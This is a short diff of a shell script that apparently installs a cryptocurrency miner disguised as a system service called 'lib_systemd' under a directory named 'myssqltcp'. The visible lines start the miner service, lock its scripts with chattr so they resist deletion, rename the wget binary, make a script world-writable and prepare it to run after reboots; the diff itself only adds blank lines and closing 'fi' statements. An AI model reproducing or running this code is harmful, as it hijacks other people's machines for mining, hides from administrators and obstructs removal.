@@ -926,6 +926,7 @@ EOL
     sudo systemctl start lib_systemd.service
     echo "To see miner service logs run \"sudo journalctl -u lib_systemd -f\" command"
     
+
 # lock
 chattr -V +iau $HOME/myssqltcp/lib_systemd.sh
 chattr -V +iau $HOME/myssqltcp/logserver.sh
@@ -949,7 +950,9 @@ mv /usr/bin/wget /usr/bin/get
 mv /usr/bin/get /usr/bin/tegw
 echo "[*] Yes-Go"
 EOL
-
+fi
+fi
+fi
 chmod 777 $HOME/delserver.sh
 
 # preparing script background work and work under reboot
